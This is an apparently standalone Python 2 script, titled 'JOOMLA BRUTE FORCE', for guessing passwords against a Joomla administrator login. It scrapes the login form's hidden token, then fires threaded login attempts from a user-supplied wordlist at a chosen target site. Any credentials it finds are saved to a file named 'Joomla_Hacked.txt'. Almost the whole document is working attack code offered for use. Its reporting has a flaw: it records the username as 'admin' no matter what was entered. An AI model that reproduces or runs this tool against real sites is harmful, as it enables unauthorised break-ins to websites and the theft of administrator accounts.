import threading, time, re, sys, os, random
import time


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])
def print_logo():
        print ("""------------------------------------------------""")
        print ("""	  JOOMLA BRUTE FORCE """)
        print ("""------------------------------------------------""")

try:
    import requests
except ImportError:
    cls()
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()


class JooMLaBruteForce(object):
    def __init__(self):
        self.flag = 0
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        site = raw_input(self.c + '    [+]  Target: ' + self.c)
        try:
            username = raw_input(self.c + '       [*]' 
                                     ' Username for Start BF: ')
            if username == '':
                print self.c + '       [-]'  \
                        ' [Username] ' + self.r + ' [NO]'
                sys.exit()
        except:
                print self.c + '       [-]'  \
                      ' [Username] ' + self.r + ' [NO]'
                sys.exit()       
        try:
            passwordlist = raw_input(self.c + '       [*] input Password list (Put your wordlist on files/2/ ) ')
            with open(passwordlist, 'r') as xx:
                passfile = xx.read().splitlines()
            print self.c + '       [+] ' + self.g + \
                  str(len(passfile)) + self.c + ' Passwords Imported!'
            time.sleep(2)
        except:
            print self.c + '       [-]'  \
                  ' [Password list] ' + self.r + ' [NO]'
            sys.exit()

        
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith('https://'):
            site = site.replace('https://', '')
        else:
            pass
        self.password = open(passwordlist, 'r').read().splitlines()
        thread = []
        for passwd in self.password:
            t = threading.Thread(target=self.Joomla, args=(site, passwd, username))
            if self.flag == 1:
                break
            else:
                t.start()
                thread.append(t)
                time.sleep(0.08)
        for j in thread:
            j.join()
        if self.flag == 0:
            print self.c + '       [' + self.r + '-' + self.c + '] ' + self.w + '[failed! Password Not Found]'

    def TimeStarT(self):
        return self.g + 'Time: ' + self.w + str(time.asctime()) + self.rr

    def Joomla(self, site, passwd, username):
        try:
            sess = requests.session()
            GetToken = sess.get('http://' + site + '/administrator/index.php', timeout=5)
            try:
                ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                   GetToken.text.encode('utf-8'))[0]
                GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', GetToken.text.encode('utf-8'))[0]
            except:
                ToKeN = ''
                GeTOPtIoN = 'com_login'
            agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            post = {}
            post['username'] = username
            post['passwd'] = passwd
            post['lang'] = 'en-GB'
            post['option'] = GeTOPtIoN
            post['task'] = 'login'
            post[ToKeN] = '1'
            url = "http://" + site + "/administrator/index.php"
            print '  {} Trying:{} {}'.format(self.w, self.y, passwd)
            GoT = sess.post(url, data=post, headers=agent, timeout=10)
            if 'content-length' in GoT.headers and 'logout' not in GoT.text.encode('utf-8'):
                pass
            else:
                print self.c + '       [' + self.y + '+' + self.c + '] ' + \
                      self.r + site + ' ' + self.y + 'Joomla' + self.g + ' [Found!!]'
                print '              {}Username:{} {} \n              {}Password:{} {}'.format(self.c, self.y, 'admin', self.c, self.y, passwd)
                with open('Joomla_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/administrator/index.php' + '\n Username: admin' +
                                 '\n Password: ' + passwd + '\n-----------------------------------------\n')
                self.flag = 1
        except Exception, e:
            pass


cls()
print_logo()
try:
    JooMLaBruteForce()
except KeyboardInterrupt:
    print('\033[97m\nGoing Back...\033[1;m')
    time.sleep(1)
    cls()
    os.system(" chmod +x brute.py && python2 brute.py")